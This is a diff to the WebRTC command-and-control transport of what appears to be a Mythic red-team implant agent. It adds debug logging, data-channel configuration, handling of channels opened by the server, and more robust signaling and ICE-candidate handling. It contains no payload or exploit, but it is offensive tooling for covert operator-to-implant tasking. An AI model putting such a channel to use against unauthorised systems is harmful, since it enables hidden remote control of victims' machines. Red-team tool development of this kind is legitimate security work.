@@ -199,6 +199,9 @@ func (c *C2WebRTC) IsRunning() bool {
 
 func (c *C2WebRTC) setupWebRTC() bool {
 	// Configure WebRTC with TURN server settings - use ICETransportPolicyRelay like server
+	utils.PrintDebug(fmt.Sprintf("Setting up WebRTC with TURN Server: %s", c.TurnServer))
+	utils.PrintDebug(fmt.Sprintf("TURN Username: %s, Password length: %d", c.TurnUsername, len(c.TurnPassword)))
+
 	config := webrtc.Configuration{
 		ICEServers: []webrtc.ICEServer{
 			{
@@ -209,6 +212,7 @@ func (c *C2WebRTC) setupWebRTC() bool {
 		},
 		ICETransportPolicy: webrtc.ICETransportPolicyRelay, // Match server config
 	}
+
 	// Create a new PeerConnection
 	var err error
 	c.PeerConnection, err = webrtc.NewPeerConnection(config)
@@ -216,21 +220,35 @@ func (c *C2WebRTC) setupWebRTC() bool {
 		utils.PrintDebug(fmt.Sprintf("Failed to create peer connection: %v", err))
 		return false
 	}
-	// Create a data channel
-	dataChannel, err := c.PeerConnection.CreateDataChannel("data", nil)
+
+	// More explicit data channel config for reliability
+	dataChannelConfig := &webrtc.DataChannelInit{
+		Ordered:        new(bool),
+		Protocol:       new(string),
+		Negotiated:     new(bool),
+		MaxRetransmits: new(uint16),
+	}
+	*dataChannelConfig.Ordered = true
+	*dataChannelConfig.Negotiated = false
+	*dataChannelConfig.Protocol = "json"
+	*dataChannelConfig.MaxRetransmits = 5
+
+	utils.PrintDebug("Creating data channel with explicit configuration")
+	dataChannel, err := c.PeerConnection.CreateDataChannel("data", dataChannelConfig)
 	if err != nil {
 		utils.PrintDebug(fmt.Sprintf("Failed to create data channel: %v", err))
 		return false
 	}
+
 	// Set up data channel handlers
 	dataChannel.OnOpen(func() {
-		utils.PrintDebug("Data channel opened")
+		utils.PrintDebug(fmt.Sprintf("Data channel opened, state: %s", dataChannel.ReadyState().String()))
 		c.Lock.Lock()
 		c.DataChannel = dataChannel
 		c.Lock.Unlock()
-		// Signal that data channel is ready - don't do checkin here
 		utils.PrintDebug("WebRTC data channel is ready for communication")
 	})
+
 	dataChannel.OnMessage(func(msg webrtc.DataChannelMessage) {
 		utils.PrintDebug(fmt.Sprintf("=== DATA CHANNEL MESSAGE RECEIVED ==="))
 		utils.PrintDebug(fmt.Sprintf("Message length: %d", len(msg.Data)))
@@ -239,10 +257,18 @@ func (c *C2WebRTC) setupWebRTC() bool {
 		// Process like the websocket client does
 		c.processMessage(msg.Data)
 	})
+
+	// Log state changes for connection tracking
+	c.PeerConnection.OnConnectionStateChange(func(state webrtc.PeerConnectionState) {
+		utils.PrintDebug(fmt.Sprintf("Peer connection state changed: %s", state))
+	})
+
 	// Set up ICE connection state handling
 	c.PeerConnection.OnICEConnectionStateChange(func(state webrtc.ICEConnectionState) {
 		utils.PrintDebug(fmt.Sprintf("ICE connection state changed: %s", state.String()))
-		if state == webrtc.ICEConnectionStateDisconnected ||
+		if state == webrtc.ICEConnectionStateConnected {
+			utils.PrintDebug("ICE connection established - ensure your data channel is ready")
+		} else if state == webrtc.ICEConnectionStateDisconnected ||
 			state == webrtc.ICEConnectionStateFailed ||
 			state == webrtc.ICEConnectionStateClosed {
 			// Connection lost, attempt to reconnect
@@ -252,6 +278,37 @@ func (c *C2WebRTC) setupWebRTC() bool {
 			}
 		}
 	})
+
+	// Handle incoming data channels as well (server might create one)
+	c.PeerConnection.OnDataChannel(func(d *webrtc.DataChannel) {
+		utils.PrintDebug(fmt.Sprintf("Received data channel from server: %s", d.Label()))
+
+		// Handle this incoming data channel
+		d.OnOpen(func() {
+			utils.PrintDebug(fmt.Sprintf("Incoming data channel opened: %s", d.Label()))
+
+			c.Lock.Lock()
+			// Only set if we don't already have one
+			if c.DataChannel == nil {
+				c.DataChannel = d
+				utils.PrintDebug("Set incoming data channel as active data channel")
+			} else {
+				utils.PrintDebug("Already have a data channel, not replacing")
+			}
+			c.Lock.Unlock()
+		})
+
+		// Set up message handler
+		d.OnMessage(func(msg webrtc.DataChannelMessage) {
+			utils.PrintDebug(fmt.Sprintf("=== INCOMING DATA CHANNEL MESSAGE RECEIVED ==="))
+			utils.PrintDebug(fmt.Sprintf("Message length: %d", len(msg.Data)))
+			utils.PrintDebug(fmt.Sprintf("Message content: %s", string(msg.Data)))
+
+			// Process the message
+			c.processMessage(msg.Data)
+		})
+	})
+
 	return true
 }
 
@@ -839,6 +896,7 @@ func (c *C2WebRTC) connectSignaling() bool {
 }
 
 // Exchange SDP and ICE candidates with the server
+// Exchange SDP and ICE candidates with the server
 func (c *C2WebRTC) exchangeSDP() bool {
 	utils.PrintDebug("Setting up WebRTC")
 
@@ -848,6 +906,8 @@ func (c *C2WebRTC) exchangeSDP() bool {
 		utils.PrintDebug(fmt.Sprintf("Failed to create offer: %v", err))
 		return false
 	}
+
+	utils.PrintDebug(fmt.Sprintf("Created offer successfully, SDP type: %v", offer.Type))
 
 	// Set local description
 	if err = c.PeerConnection.SetLocalDescription(offer); err != nil {
@@ -885,6 +945,7 @@ func (c *C2WebRTC) exchangeSDP() bool {
 	}
 
 	// Send the actual message
+	utils.PrintDebug(fmt.Sprintf("Sending offer message (full message): %+v", offerMessage))
 	if err := c.SignalingConn.WriteJSON(offerMessage); err != nil {
 		utils.PrintDebug(fmt.Sprintf("Failed to send offer: %v", err))
 		return false
@@ -900,31 +961,75 @@ func (c *C2WebRTC) exchangeSDP() bool {
 	// Handle ICE candidates
 	c.PeerConnection.OnICECandidate(func(candidate *webrtc.ICECandidate) {
 		if candidate == nil {
+			utils.PrintDebug("Received nil ICE candidate, not sending")
 			return
 		}
 
 		// Send the candidate to the signaling server
 		candidateJSON := candidate.ToJSON()
+		candidateStr := candidateJSON.Candidate
+
+		utils.PrintDebug(fmt.Sprintf("Generated ICE candidate: %s", candidateStr))
+
+		if candidateStr == "" {
+			utils.PrintDebug("WARNING: Empty candidate string generated")
+			return
+		}
+
 		signalMessage := SignalMessage{
 			Type:        "candidate",
 			Destination: "answer",
-			Candidate:   candidateJSON.Candidate,
+			Candidate:   candidateStr,
 			AuthKey:     c.AuthKey,
 			AgentUUID:   GetMythicID(),
 		}
 
-		c.SignalingConn.WriteJSON(signalMessage)
+		// Check if signaling connection is still active
+		if c.SignalingConn == nil {
+			utils.PrintDebug("SignalingConn is nil, can't send ICE candidate")
+			return
+		}
+
+		utils.PrintDebug(fmt.Sprintf("Sending ICE candidate: %s", candidateStr))
+		err := c.SignalingConn.WriteJSON(signalMessage)
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("Failed to send ICE candidate: %v", err))
+		} else {
+			utils.PrintDebug("Successfully sent ICE candidate")
+		}
 	})
 
 	// Start a goroutine to handle signaling messages
 	go func() {
+		// Add panic recovery
+		defer func() {
+			if r := recover(); r != nil {
+				utils.PrintDebug(fmt.Sprintf("Recovered from panic in signaling handler: %v", r))
+				doneChan <- false
+			}
+		}()
+
 		for {
+			// Check if connection is still valid
+			if c.SignalingConn == nil {
+				utils.PrintDebug("SignalingConn is nil, exiting signaling handler")
+				doneChan <- false
+				return
+			}
+
 			// Read a message from the signaling server
 			var msg SignalMessage
 
 			err := c.SignalingConn.ReadJSON(&msg)
 			if err != nil {
 				utils.PrintDebug(fmt.Sprintf("Error reading from signaling server: %v", err))
+				// Try to read any error messages that might have been sent
+				var errorMsg SignalMessage
+				if c.SignalingConn != nil {
+					if errRead := c.SignalingConn.ReadJSON(&errorMsg); errRead == nil && errorMsg.Type == "error" {
+						utils.PrintDebug(fmt.Sprintf("Server sent error: %s", errorMsg.Data))
+					}
+				}
 				doneChan <- false
 				return
 			}
@@ -951,6 +1056,7 @@ func (c *C2WebRTC) exchangeSDP() bool {
 			case "candidate":
 				// Parse the ICE candidate
 				if msg.Candidate == "" {
+					utils.PrintDebug("Received empty ICE candidate from server, ignoring")
 					continue
 				}
 
@@ -965,6 +1071,12 @@ func (c *C2WebRTC) exchangeSDP() bool {
 				// WebRTC connection is established
 				utils.PrintDebug("Received 'connected' message from signaling server")
 				doneChan <- true
+				return
+
+			case "error":
+				// Server reported an error
+				utils.PrintDebug(fmt.Sprintf("Server reported error: %s", msg.Data))
+				doneChan <- false
 				return
 			}
 		}
@@ -991,16 +1103,21 @@ func (c *C2WebRTC) exchangeSDP() bool {
 	candidatesProcessed := 0
 	timeout := time.After(15 * time.Second)
 
+	// Wait for connection establishment or timeout
 	for {
 		select {
 		case candidate := <-candidateChan:
 			// Add the ICE candidate
-			err = c.PeerConnection.AddICECandidate(candidate)
-			if err != nil {
-				utils.PrintDebug(fmt.Sprintf("Failed to add ICE candidate: %v", err))
+			if c.PeerConnection != nil {
+				err = c.PeerConnection.AddICECandidate(candidate)
+				if err != nil {
+					utils.PrintDebug(fmt.Sprintf("Failed to add ICE candidate: %v", err))
+				} else {
+					candidatesProcessed++
+					utils.PrintDebug(fmt.Sprintf("Added ICE candidate (%d)", candidatesProcessed))
+				}
 			} else {
-				candidatesProcessed++
-				utils.PrintDebug(fmt.Sprintf("Added ICE candidate (%d)", candidatesProcessed))
+				utils.PrintDebug("PeerConnection is nil, can't add ICE candidate")
 			}
 
 		case success := <-doneChan:
@@ -1011,6 +1128,26 @@ func (c *C2WebRTC) exchangeSDP() bool {
 			// Timeout reached, but we may have enough candidates
 			if candidatesProcessed > 0 {
 				utils.PrintDebug("Timeout waiting for more ICE candidates, but proceeding")
+
+				dataChannelReady := false
+				for waitTime := 0; waitTime < 10; waitTime++ {
+					c.Lock.RLock()
+					if c.DataChannel != nil && c.DataChannel.ReadyState() == webrtc.DataChannelStateOpen {
+						dataChannelReady = true
+						c.Lock.RUnlock()
+						break
+					}
+					c.Lock.RUnlock()
+
+					utils.PrintDebug(fmt.Sprintf("Waiting for data channel to be ready (%d/10)...", waitTime+1))
+					time.Sleep(1 * time.Second)
+				}
+
+				if dataChannelReady {
+					utils.PrintDebug("Data channel ready, sending 'connected' message to server")
+				} else {
+					utils.PrintDebug("Timeout waiting for data channel to be ready, but proceeding anyway")
+				}
 
 				// Send a 'connected' message to the server
 				connectedMsg := SignalMessage{
@@ -1051,19 +1188,24 @@ func (c *C2WebRTC) startDataChannelListener() {
 	for {
 		c.Lock.RLock()
 		dataChannel := c.DataChannel
+		dataChannelReady := dataChannel != nil && dataChannel.ReadyState() == webrtc.DataChannelStateOpen
 		c.Lock.RUnlock()
 
-		if dataChannel != nil {
+		if dataChannelReady {
+			utils.PrintDebug("Data channel is ready for push mode")
 			break
 		}
+
 		if c.ShouldStop || c.TaskingType == TaskingTypePoll {
 			return
 		}
-		time.Sleep(100 * time.Millisecond)
+
+		utils.PrintDebug("Waiting for data channel to be ready for push mode...")
+		time.Sleep(500 * time.Millisecond)
 	}
 
-	// Send initial checkin message
-	utils.PrintDebug("Data channel established, sending checkin")
+	// Now we have a data channel, proceed with checkin
+	utils.PrintDebug("Data channel established, proceeding with push mode")
 
 	// If we're exchanging keys, start the key exchange
 	if c.ExchangingKeys {
